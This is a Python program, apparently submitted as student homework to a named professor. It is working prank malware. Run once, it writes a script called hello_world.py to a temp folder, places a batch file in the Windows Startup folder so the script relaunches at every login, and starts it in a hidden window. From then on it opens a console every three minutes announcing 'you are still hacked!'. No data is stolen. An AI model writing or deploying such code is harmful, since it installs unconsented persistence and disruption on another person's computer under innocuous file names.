import os, sys
import time
import runpy
import subprocess
import traceback
import tempfile


# ================================================
# CONFIGURATION
# ================================================

APP_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))

OUTPUT_DIR = os.path.join(
    tempfile.gettempdir(),
    "csaiqc_summer_homework_761386171",
    "example_files"
)


# ================================================
# CHILD PROCESS MODES
# ================================================

def run_generated_script(script_path):
    """Execute a generated Python script."""

    script_path = os.path.abspath(script_path)

    # Allow imports from the generated script's directory
    sys.path.insert(0, os.path.dirname(script_path))

    runpy.run_path(
        script_path,
        run_name="__main__"
    )


def run_generated_function(script_path, function_name):
    """Execute one specific function from a generated script."""

    script_path = os.path.abspath(script_path)

    # Allow imports from the generated script's directory
    sys.path.insert(0, os.path.dirname(script_path))

    # Import the script without executing its __main__ section
    namespace = runpy.run_path(
        script_path,
        run_name="__generated_module__"
    )

    # Retrieve and execute the requested function
    function = namespace.get(function_name)

    if not callable(function):
        raise AttributeError(
            f"Function '{function_name}' was not found "
            f"in '{script_path}'."
        )

    function()


def handle_child_process():
    """Determine whether this executable is running as a child."""

    if len(sys.argv) >= 3 and sys.argv[1] == "--run-generated":

        try:
            run_generated_script(sys.argv[2])
        except Exception:
            traceback.print_exc()

            if os.name == "nt":
                input("\nPress Enter to close this window...")

            sys.exit(1)

        sys.exit(0)

    if len(sys.argv) >= 4 and sys.argv[1] == "--run-function":

        try:
            run_generated_function(
                sys.argv[2],
                sys.argv[3]
            )
        except Exception:
            traceback.print_exc()

            if os.name == "nt":
                input("\nPress Enter to close this window...")

            sys.exit(1)

        sys.exit(0)


# IMPORTANT: Handle child modes BEFORE executing the main application.
handle_child_process()


# ================================================
# MAIN APPLICATION
# ================================================

def add_to_windows_startup(script_path):

    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )

    os.makedirs(startup_folder, exist_ok=True)

    shortcut_path = os.path.join(
        startup_folder,
        "GeneratedScript.bat"
    )

    with open(shortcut_path, "w", encoding="utf-8") as f:
        f.write(
            f'@echo off\n'
            f'cd /d "{os.path.dirname(script_path)}"\n'
            f'"{sys.executable}" --run-generated "{script_path}"\n'
        )

def generate_and_launch(func_str):

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    script_path = os.path.join(
        OUTPUT_DIR,
        "hello_world.py"
    )

    # Generate the Python script
    with open(script_path, "w", encoding="utf-8") as source:
        source.write(func_str)

    add_to_windows_startup(script_path)

    env = os.environ.copy()
    env["PYINSTALLER_RESET_ENVIRONMENT"] = "1"

    kwargs = {
        "cwd": OUTPUT_DIR,
        "env": env,
        "close_fds": True,
    }

    if os.name == "nt":
        kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW

    subprocess.Popen(
        [
            sys.executable,
            "--run-generated",
            script_path
        ],
        **kwargs
    )


# ================================================
# GENERATED SCRIPT
# ================================================

launched_subprocess_str = r'''
import os
import sys
import subprocess
import time

current_direc = os.path.dirname(os.path.abspath(__file__))


def launch_detached_process(func_name):

    env = os.environ.copy()
    env["PYINSTALLER_RESET_ENVIRONMENT"] = "1"

    kwargs = {
        "cwd": current_direc,
        "env": env,
        "close_fds": True,
    }

    if os.name == "nt":
        kwargs["creationflags"] = subprocess.CREATE_NEW_CONSOLE

    subprocess.Popen(
        [
            sys.executable,
            "--run-function",
            os.path.abspath(__file__),
            func_name
        ],
        **kwargs
    )


def infinite_reminder():
    print("Just a reminder, you are still hacked!", flush=True)
    time.sleep(30)


if __name__ == "__main__":
    while True:
        time.sleep(60 * 3)
        launch_detached_process("infinite_reminder")
'''


# ================================================
# ENTRY POINT
# ================================================

if __name__ == "__main__":
    generate_and_launch(launched_subprocess_str)

    print("Hello Dr. Chugani!")
    time.sleep(3.5)
    print("You have been hacked.")
    time.sleep(3.5)
    print("Authors:\n - Gerald (project manager / backend engineer)\n - Emmanuel (game designer / game developer)")
    time.sleep(3.5)
    print("Have fun!")
    time.sleep(120)